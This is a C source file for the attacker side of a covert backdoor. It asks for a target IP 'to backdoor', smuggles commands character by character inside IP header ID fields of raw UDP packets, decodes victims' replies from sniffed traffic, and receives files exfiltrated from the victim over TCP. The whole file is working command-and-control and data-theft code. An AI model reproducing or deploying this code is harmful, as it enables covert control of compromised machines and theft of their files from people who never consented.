#include "attacker.h"

int main(void) {
    struct options_attacker opts;
    u_char* args = NULL;
    char errbuf[PCAP_ERRBUF_SIZE] = {0};
    char* nic_interface;
    bpf_u_int32 netp, maskp;
    pcap_t* nic_fd;
    struct bpf_program fp;
    pthread_t command_thread, tcp_thread;

    signal(SIGINT,sig_handler);
    check_root_user();
    program_setup();
    options_attacker_init(&opts);
    get_dest_ip(&opts);
    nic_interface = pcap_lookupdev(errbuf);
    get_my_ip(nic_interface, &opts);
    puts("============ Initialize ATTACKER ============");
    fflush(stdout);

    create_socket(&opts, 'A', 'U', opts.dest_ip, VIC_UDP_PORT);
    create_socket(&opts, 'A', 'T', opts.dest_ip, VIC_TCP_PORT);
    create_socket(&opts, 'A', 'R', opts.dest_ip, VIC_FILE_PORT);

    if (pthread_create(&command_thread, NULL, input_select_call, (void*)&opts) != 0) {
        perror("udp thread create error");
        exit(EXIT_FAILURE);
    }

    if (pthread_create(&tcp_thread, NULL, tcp_select_call, (void*)&opts) != 0) {
        perror("tcp thread create error");
        exit(EXIT_FAILURE);
    }


    pcap_lookupnet(nic_interface, &netp, &maskp, errbuf);
    nic_fd = pcap_open_live(nic_interface, BUFSIZ, 1, -1, errbuf);
    args = (u_char*)&opts;
    if (nic_fd == NULL) {
        printf("pcap_open_live(): %s\n", errbuf);
        exit(EXIT_FAILURE);
    }

    if (pcap_compile (nic_fd, &fp, FILTER, 0, netp) == -1) {
        fprintf(stderr,"Error calling pcap_compile\n");
        exit(1);
    }

    // Load the filter into the capture device
    if (pcap_setfilter (nic_fd, &fp) == -1) {
        fprintf(stderr,"Error setting filter\n");
        exit(1);
    }
    pcap_loop(nic_fd, PACKET_COUNT, pkt_callback, args);
    return EXIT_SUCCESS;
}


void options_attacker_init(struct options_attacker *opts) {
    memset(opts, 0, sizeof(struct options_attacker));
}


void get_dest_ip(struct options_attacker *opts) {
    uint8_t input_length;

    while (1) {
        printf("Enter [ TARGET IP ] to backdoor: ");
        fflush(stdout);
        fgets(opts->dest_ip, sizeof(opts->dest_ip), stdin);
        input_length = (uint8_t) strlen(opts->dest_ip);
        if (input_length > 0 && opts->dest_ip[input_length - 1] == '\n') {
            opts->dest_ip[input_length - 1] = '\0';
            if (is_valid_ipaddress(opts->dest_ip) == 0) {
                puts("Invalid IP address");
            }
            else break;
        }
    }
}


bool is_valid_ipaddress(char *ip_address) {
    struct sockaddr_in sa;
    int result;

    result = inet_pton(AF_INET, ip_address, &(sa.sin_addr));
    return result;
}


void get_my_ip(char *nic_interface, struct options_attacker *opts) {
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, nic_interface, IFNAMSIZ-1);

    ioctl(fd, SIOCGIFADDR, &ifr);
    close(fd);

    strcpy(opts->my_ip, inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
}



void* input_select_call(void* arg) {
    struct options_attacker *opts = (struct options_attacker*)arg;
    char instruction[64] = {0}, s_buffer[UDP_SEND_SIZE] = {0}, r_buffer[5000] = {0};
    int byte;

    fd_set reads, cpy_reads;
    struct timeval timeout;
    int fd_max, fd_num;

    struct iphdr ih;
    struct udphdr uh;
    size_t length = 0;

    timeout.tv_sec = 1;
    timeout.tv_usec = 0;


    FD_ZERO(&reads);
    FD_SET(STDIN_FILENO, &reads);
    FD_SET(opts->rtcp_socket, &reads);

    fd_max = opts->rtcp_socket;

    while (1) {
        cpy_reads = reads;
        fd_num = select(fd_max + 1, &cpy_reads, 0, 0, &timeout);
        if (fd_num == -1) {
            perror("Select() failed");
            exit(EXIT_FAILURE);
        }
        else if (fd_num == 0) continue; // time out
        for (int i = 0; i < fd_max + 1; i++) {
            if (FD_ISSET(i, &cpy_reads)) {
                if (i == STDIN_FILENO) {
                    puts("============ RESULT ============");
                    if (fgets(opts->victim_instruction, sizeof(opts->victim_instruction), stdin)) {
                        opts->victim_instruction[strlen(opts->victim_instruction) - 1] = 0;
                        if (strstr(opts->victim_instruction, "target") != NULL ) {
                            strcpy(opts->target_directory, opts->victim_instruction + 7);
                            opts->target = TRUE;
                        }
                        sprintf(instruction, "[[%s]]", opts->victim_instruction);
                        length = strlen(instruction);
                        for (int j = 0; j < length; j++) {
                            create_udp_header(&uh, ATC_UDP_PORT, VIC_UDP_PORT);
                            create_ip_header(&ih,opts, 'A', instruction[j], 'U');
                            memcpy(s_buffer, &ih, sizeof(struct iphdr));
                            memcpy(s_buffer + sizeof(struct iphdr), &uh, sizeof(struct udphdr));
                            byte = (int)sendto(opts->udp_socket, (const char*)s_buffer, UDP_SEND_SIZE, 0,
                                          (const struct sockaddr*)&opts->udpsa, sizeof(opts->udpsa));
                            if (byte < 0) {
                                perror("send failed\n");
                            }
                            memset(s_buffer, 0, UDP_SEND_SIZE);
                        }
                        memset(instruction, 0, 64);
                    }
                }
            }
        }
    }
    close(opts->udp_socket);
    pthread_exit(NULL);
}


void pkt_callback(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet) {
    struct ether_header* ether;

    /* ETHERNET - only handle IPv4 */
    ether = (struct ether_header*)(packet);
    if (ntohs(ether->ether_type) == ETHERTYPE_IP) {
        process_ipv4(args, pkthdr, packet);
    }
}


void process_ipv4(u_char *args, const struct pcap_pkthdr* pkthdr, const u_char* packet) {
    struct ether_header* ether;
    struct iphdr *ip;
    char c;

    ether = (struct ether_header*)(packet);
    ip = (struct iphdr*)(((char*) ether) + sizeof(struct ether_header));
    c = (char)hide_data(ntohs(ip->id));

    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    printf("%c", c);

}


void tokenize_file_info(struct options_attacker *opts, char* buffer) {
    char *start = strchr(buffer, '[');
    char *file_name;
    char *token;
    if (start != NULL) {
        file_name = strtok(start + 1, " ");
        if (file_name != NULL) {
            strcpy(opts->file_name, file_name);
            token = strtok(NULL, " ");
            if (token != NULL && strcmp(token, "size:") == 0) {
                // Extract size
                token = strtok(NULL, "]end");
                if(token != NULL) {
                    opts->file_size = atoi(token);
                }
            }
        }
    }
    opts->data = malloc(sizeof(char) * (unsigned long) opts->file_size);
}


void create_file(struct options_attacker *opts) {
    FILE *fp = fopen(opts->file_name, "wb");
    if(fp == NULL) {
        perror("create_file() - Failed to open file");
    }

    fwrite(opts->data, (unsigned long) opts->file_size, 1, fp);

    free(opts->data);
    opts->size = 0;
    opts->file_flag = FALSE;
    fclose(fp);
    printf("File downloaded complete");
}


void* tcp_select_call(void* arg) {
    struct options_attacker *opts = (struct options_attacker*)arg;
    char r_buffer[5000] = {0};

    while(1) {
        while (1) {
            if (opts->target == TRUE) {
                sleep(1);
                if(connect(opts->rtcp_socket, (struct sockaddr*)&opts->rtcpsa, sizeof(opts->rtcpsa)) < 0 ){
                    perror("attacker rtcp connect() ERROR\n");
                    exit(EXIT_FAILURE);
                }
                break;
            }
        }

        while (opts->target == TRUE) {
            fd_set reads, cpy_reads;
            struct timeval timeout;
            int fd_max, fd_num;

            timeout.tv_sec = 1;
            timeout.tv_usec = 0;

            FD_ZERO(&reads);
            FD_SET(opts->rtcp_socket, &reads);
            fd_max = opts->rtcp_socket;

            while (1) {
                cpy_reads = reads;
                fd_num = select(fd_max + 1, &cpy_reads, 0, 0, &timeout);
                if (fd_num == -1) {
                    perror("Select() failed");
                    exit(EXIT_FAILURE);
                }
                else if (fd_num == 0) continue; // time out
                for (int i = 0; i < fd_max + 1; i++) {
                    if (FD_ISSET(i, &cpy_reads)) {
                        if (i == opts->rtcp_socket) {
                            int bytes = (int) read(opts->rtcp_socket, r_buffer, sizeof(r_buffer));

                            if (opts->file_flag == TRUE) {
                                memcpy(opts->data + opts->size, r_buffer, (unsigned long) bytes);
                                opts->size += bytes;
                                if (opts->size >= opts->file_size) {
                                    create_file(opts);
                                    opts->target = FALSE;
                                    opts->file_flag = FALSE;
                                }
                            }

                            if (opts->file_flag == FALSE) {
                                tokenize_file_info(opts, r_buffer);
                                setvbuf(stdout, NULL, _IONBF, 0);
                                setvbuf(stderr, NULL, _IONBF, 0);
                                opts->file_flag = TRUE;
                                bytes = 0;
                            }
                            memset(r_buffer, 0, sizeof(r_buffer));
                        }
                    }
                }
            }
        }
    }
}
